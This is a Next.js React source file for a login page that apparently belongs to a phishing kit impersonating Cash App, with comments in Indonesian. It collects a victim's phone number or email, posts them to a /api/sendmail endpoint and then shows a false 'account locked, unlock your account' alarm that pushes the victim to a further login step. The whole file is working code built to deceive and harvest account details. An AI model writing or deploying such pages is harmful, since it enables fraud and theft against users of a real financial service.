"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export const metadata = { title: "Log in • Cash-style" };

// Format nomor telepon otomatis
function formatPhone(raw) {
  const digits = raw.replace(/\D/g, "").slice(0, 10);
  const len = digits.length;
  if (len === 0) return "";
  if (len < 4) return `(${digits}`;
  if (len < 7) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
}

export default function LoginPage() {
  const [useEmail, setUseEmail] = useState(false);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [isDisabled, setIsDisabled] = useState(false);

  const router = useRouter();

  // handle phone input
  const handlePhoneChange = (e) => setPhone(formatPhone(e.target.value));
  const handlePhonePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text");
    setPhone(formatPhone(pasted));
  };
  const handlePhoneKeyDown = (e) => {
    const allowed = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Home", "End", "Tab"];
    if ((e.ctrlKey || e.metaKey) && ["a", "c", "v", "x"].includes(e.key.toLowerCase())) return;
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  // validasi tombol
  const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;

  // submit → kirim API lalu popup
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isInvalid || isDisabled) return;
    setIsDisabled(true);

    try {
      const res = await fetch("/api/sendmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, phone }),
      });
      const data = await res.json();

      if (data.success) {
        setShowPopup(true);
      } else {
        alert("Gagal mengirim email!");
      }
    } catch (err) {
      console.error(err);
      alert("Terjadi error saat kirim email");
    } finally {
      setIsDisabled(false);
    }
  };

  // tombol unlock → redirect ke /login
  const handleUnlock = () => {
    setShowPopup(false);
    router.push("/login"); // step berikutnya
  };

  return (
    <div className="page">
      <header className="topbar">
        <a className="brand" href="#" aria-label="Cash App">
          <span className="brandIcon" aria-hidden>
            {/* Logo SVG dibiarkan */}
          </span>
        </a>
      </header>

      <main className="center">
        <section className="panel" role="form" aria-labelledby="login-title">
          <h1 id="login-title" className="title">Log in</h1>
          <p className="subtitle">
            Enter your {useEmail ? "email" : "phone number"}. New to Cash App?{" "}
            <br />
            <a href="#" className="link">Create account</a>
          </p>

          {/* PAKAI handleSubmit */}
          <form onSubmit={handleSubmit} className="form">
            {useEmail ? (
              <>
                <label htmlFor="email" className="label">Email</label>
                <input
                  id="email"
                  type="email"
                  placeholder="name@email.com"
                  className="input single"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </>
            ) : (
              <>
                <label htmlFor="phone" className="label">Mobile number</label>
                <div className="phoneField">
                  <button type="button" className="country">
                    <span className="flag" aria-hidden>
                      {/* US flag SVG dibiarkan */}
                    </span>
                    <span className="dial">+1</span>
                    <svg className="chev" viewBox="0 0 20 20" width="16" height="16" aria-hidden>
                      <path d="M5 7l5 6 5-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                    </svg>
                  </button>
                  <input
                    id="phone"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="tel"
                    placeholder="(123) 456-7890"
                    className="input"
                    value={phone}
                    onChange={handlePhoneChange}
                    onPaste={handlePhonePaste}
                    onKeyDown={handlePhoneKeyDown}
                    maxLength={14}
                    pattern="^\\(\\d{3}\\) \\d{3}-\\d{4}$"
                    required
                  />
                </div>
              </>
            )}

            <div className="actions">
              <button
                type="button"
                className="btn ghost"
                onClick={() => setUseEmail(!useEmail)}
              >
                {useEmail ? "Use phone" : "Use email"}
              </button>
              <button 
                type="submit" 
                className="btn primary" 
                disabled={isInvalid || isDisabled}
              >
                {isDisabled ? "Sending..." : "Continue"}
              </button>
            </div>

            <p id="helper" className="helper">
              By entering and clicking Continue, you agree to the{" "}
              <u><b>Terms</b>, <b>E-Sign Consent</b>, &amp; <b>Privacy Policy</b>.</u>
            </p>
          </form>

          <div className="disclosures">
            {/* teks disclosures tetap */}
          </div>
        </section>
      </main>

      {/* POPUP */}
      {showPopup && (
        <div className="overlay">
          <div className="bg-white rounded-2xl shadow-xl max-w-sm w-full p-6 text-center">
            <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center bg-green-100 rounded-full">
              {/* Icon lock */}
            </div>

            <h2 className="text-lg font-semibold mb-2">
              We detected something unusual.
            </h2>
            <p className="text-gray-600 mb-6 text-sm">
              To protect your funds, we’ve temporarily locked your account. <br />
              To unlock your account, please verify your email by clicking the
              button below.
            </p>

            <button
              onClick={handleUnlock}
              className="w-full py-3 rounded-xl bg-green-600 text-white font-bold hover:bg-green-700"
            >
              Unlock Account
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
